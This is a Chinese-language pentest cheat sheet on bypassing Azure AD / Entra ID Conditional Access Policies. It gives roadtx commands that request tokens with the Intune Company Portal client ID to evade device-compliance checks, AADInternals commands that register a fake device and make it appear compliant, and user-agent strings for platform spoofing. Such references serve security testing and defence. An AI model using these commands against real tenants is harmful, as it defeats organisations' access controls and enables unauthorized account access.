# Azure AD - 条件访问策略 (Conditional Access Policy / CAP)

条件访问 (Conditional Access) 用于将资源访问限制为仅限合规设备。

* [rbnroot/CAPSlock](https://github.com/rbnroot/CAPSlock) - 基于 roadrecon 数据库构建的离线条件访问 (CA) 分析工具。
* [absolomb/FindMeAccess](https://github.com/absolomb/FindMeAccess) - 用于发现不同资源、客户端 ID 和用户代理在 Azure/M365 MFA 要求中存在的差距的工具。

## 枚举条件访问策略 (Enumerate Conditional Access Policies)

* 枚举条件访问策略：`roadrecon plugin policies` (查询本地数据库)

| 条件访问策略 (CAP) | 绕过方式 (Bypass) |
|---------------------------|---------|
| 地点 / IP 范围 (Location / IP ranges) | 公司 VPN、访客 Wifi |
| 平台要求 (Platform requirement) | User-Agent 切换器 (Android, PS4, Linux, ...) |
| 协议要求 (Protocol requirement) | 使用另一种协议（例如访问电子邮件：POP, IMAP, SMTP）|
| 加入 Azure AD 的设备 (Azure AD Joined Device) | 尝试加入虚拟机 (工作访问)|
| 合规设备 (Compliant Device / Intune) | 伪造设备合规性 |
| 设备要求 (Device requirement) | / |
| MFA | / |
| 传统协议 (Legacy Protocols) | / |
| 加入域 (Domain Joined) | / |

```ps1
python3 CAPSlock.py analyze -u <userprincipalname> --resource <resource-id> [选项]
python3 CAPSlock.py what-if -u <userprincipalname> --resource <resource-id> [选项]
python3 CAPSlock.py web-gui --port 8080
```

## 通过伪造设备合规性绕过 CAP (Bypassing CAP by faking device compliance)

### Intune 公司门户客户端 ID 绕过 (Intune Company Portal Client ID Bypass)

即使存在设备合规性策略，也可以使用 Intune 公司门户客户端 ID (`9ba1a5c7-f17a-4de9-a1f1-6178c8d51223`) 来运行 `roadrecon`。这是条件访问中针对设备合规性的硬编码且未公开的排除项，并且在 AAD Graph 上具有 `user_impersonation` 权限。

* 客户端 ID：`9ba1a5c7-f17a-4de9-a1f1-6178c8d51223`

```ps1
roadtx gettokens -u $username -p $password -r msgraph -ua $windows_ua -c 9ba1a5c7-f17a-4de9-a1f1-6178c8d51223 # 限制范围 (limited scope)
roadtx gettokens -u $username -p $password -r aadgraph -ua $windows_ua -c 9ba1a5c7-f17a-4de9-a1f1-6178c8d51223 # user_impersonation 范围 (scope)
```

### AAD Internals - 让你的设备变得合规

```powershell
# 获取用于 AAD 加入的访问令牌并保存到缓存
Get-AADIntAccessTokenForAADJoin -SaveToCache

# 将设备加入 Azure AD
Join-AADIntDeviceToAzureAD -DeviceName "SixByFour" -DeviceType "Commodore" -OSVersion "C64"

# 标记设备为合规 - 选项 1：将设备注册到 Intune
# 获取 Intune MDM 的访问令牌并保存到缓存（会提示输入凭据）
Get-AADIntAccessTokenForIntuneMDM -PfxFileName .\d03994c9-24f8-41ba-a156-1805998d6dc7.pfx -SaveToCache 

# 将设备加入 Intune
Join-AADIntDeviceToIntune -DeviceName "SixByFour"

# 启动回调
Start-AADIntDeviceIntuneCallback -PfxFileName .\d03994c9-24f8-41ba-a156-1805998d6dc7-MDM.pfx -DeviceName "SixByFour"
```

## 通过 device.trustType 绕过 CAP

`trustType` 属性是一个内部属性，用于定义设备与 Azure AD 之间的关系。
当 CAP 的条件为 `device.trustType -eq "<TYPE>"` 时，其值可以是：

* `AzureAD`: 加入 Azure AD 的设备 (Azure AD joined devices)
* `Workplace`: 注册到 Azure AD 的设备 (Azure AD registered devices)
* `ServerAD`: 混合加入的设备 (Hybrid joined devices)

## 通过用户代理 (User Agent) 绕过 CAP

你可以使用多种设备来验证并与服务交互。
尝试多种 `User-Agent` 来获取资源访问权限：

* Windows: `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 GLS/100.10.9939.100`
* Linux: `Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36 uacq`
* macOS: `Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36 uacq`
* Android: `Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.117 Mobile Safari/537.36`
* iOS: `Mozilla/5.0 (iPhone; CPU iPhone OS 15_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/98.0.4758.85 Mobile/15E148 Safari/604.1`
* WindowsPhone: `Mozilla/5.0 (Windows Phone 10.0; Android 4.2.1; Microsoft; Lumia 650) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.85 Safari/537.36`

## 通过地点 (Location) 绕过 CAP

使用 VPN 尝试不同的 IP 地点。

## 参考资料 (References)

* [Conditional Access bypasses - Fabian Bader - November 30, 2025](https://cloudbrothers.info/en/conditional-access-bypasses/)
* [Finding Entra ID CA Bypasses - the structured way - Dirk-jan Mollema and Fabian Bader - June 23, 2025](https://troopers.de/troopers25/talks/tfsfqs/)
* [STOP THE CAP: Making Entra ID Conditional Access Make Sense Offline - Lee Robinson - February 17, 2026](https://specterops.io/blog/2026/02/17/stop-the-cap-making-entra-id-conditional-access-make-sense-offline/)
